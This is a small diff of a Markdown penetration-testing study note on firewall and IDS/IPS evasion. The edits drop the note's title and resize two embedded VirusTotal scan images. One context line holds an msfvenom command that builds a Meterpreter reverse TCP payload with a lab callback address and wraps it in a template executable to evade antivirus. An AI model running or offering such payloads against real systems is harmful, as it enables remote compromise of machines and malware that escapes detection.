@@ -1,8 +1,3 @@
-
-# 📘 Firewall & IDS/IPS Evasion – Detailed Notes
-
----
-
 ## 🧠 Understanding Target Defenses
 
 Before attacking, we must understand how systems are protected.
@@ -278,9 +273,9 @@ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x T
 
 ![Image](https://static.opswat.com/uploads/blog/why-archive-files-are-the-1-choice-for-cyberattacks-01.jpeg)
 
-![Image](https://www.researchgate.net/publication/346374643/figure/fig3/AS%3A11431281081051636%401661499133722/An-example-of-virus-total-scan-results.ppm)
+![Image|66](https://www.researchgate.net/publication/346374643/figure/fig3/AS%3A11431281081051636%401661499133722/An-example-of-virus-total-scan-results.ppm)
 
-![Image](https://www.researchgate.net/publication/354477993/figure/fig3/AS%3A1068049230737408%401631654188242/The-results-of-virustotal-scanning-before-and-after-embedding-the-ransomware-APK-file-a.ppm)
+![Image|66](https://www.researchgate.net/publication/354477993/figure/fig3/AS%3A1068049230737408%401631654188242/The-results-of-virustotal-scanning-before-and-after-embedding-the-ransomware-APK-file-a.ppm)
 
 ✔️ Example:
 
